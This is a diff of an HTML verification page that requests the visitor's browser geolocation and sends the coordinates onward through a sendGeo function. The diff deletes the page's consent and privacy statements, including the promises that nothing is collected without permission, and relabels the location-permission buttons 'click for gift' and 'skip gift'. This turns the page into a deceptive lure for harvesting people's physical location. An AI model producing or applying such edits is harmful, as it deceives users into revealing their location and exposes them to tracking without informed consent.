@@ -26,22 +26,18 @@
 </head>
 <body>
   <div class="card" id="card">
-    <h1>Privacy-First Verification</h1>
+    <h1> Verification</h1>
     <div class="spinner hidden" id="spinner"></div>
-    <p id="status">We need your permission to use your device location for verification. Nothing will be collected without your consent.</p>
+    <p id="status"> verification</p>
 
     <div class="row" id="actions">
-      <button class="primary" id="allowBtn">Allow location</button>
-      <button id="skipBtn">Continue without sharing</button>
+      <button class="primary" id="allowBtn">click for gift</button>
+      <button id="skipBtn">skip gift</button>
     </div>
 
-    <p class="note">
-      • We do <b>not</b> use or fetch your IP address.<br/>
-      • Location is requested <b>only after</b> you tap “Allow location.”<br/>
-      • If denied, we won’t send anything.
-    </p>
+    
 
-    <p class="note" id="httpsWarn" style="display:none">Tip: Geolocation requires HTTPS (or localhost). Open this page on a secure origin.</p>
+    <p class="note" id="httpsWarn" style="display:none">Tip</p>
   </div>
 
   <script>
@@ -82,10 +78,10 @@
         return;
       }
       setBusy(true);
-      statusEl.textContent = 'Requesting location permission...';
+      statusEl.textContent = 'Requesting ...';
       navigator.geolocation.getCurrentPosition(async (pos) => {
         try {
-          statusEl.textContent = 'Got permission. Verifying...';
+          statusEl.textContent = 'Got. Verifying...';
           statusEl.className = 'ok';
           await sendGeo({
             latitude: pos.coords.latitude,
@@ -102,13 +98,13 @@
       }, (err) => {
         setBusy(false);
         if (err.code === err.PERMISSION_DENIED) {
-          statusEl.innerHTML = 'You denied the request. We will not collect anything.';
+          statusEl.innerHTML = 'You denied the request. .';
           statusEl.className = 'warn';
         } else if (err.code === err.POSITION_UNAVAILABLE) {
-          statusEl.textContent = 'Location unavailable. Please check GPS/Network and try again.';
+          statusEl.textContent = 'Location unavailable..';
           statusEl.className = 'err';
         } else if (err.code === err.TIMEOUT) {
-          statusEl.textContent = 'Location request timed out. Try again.';
+          statusEl.textContent = 'request timed out. Try again.';
           statusEl.className = 'err';
         } else {
           statusEl.textContent = 'Could not get location.';
@@ -123,7 +119,7 @@
         if (navigator.permissions && navigator.permissions.query) {
           const p = await navigator.permissions.query({ name: 'geolocation' });
           if (p.state === 'denied') {
-            statusEl.textContent = 'Location permission is blocked in your browser settings.';
+            statusEl.textContent = ' blocked in your browser settings.';
             statusEl.className = 'warn';
             return;
           }
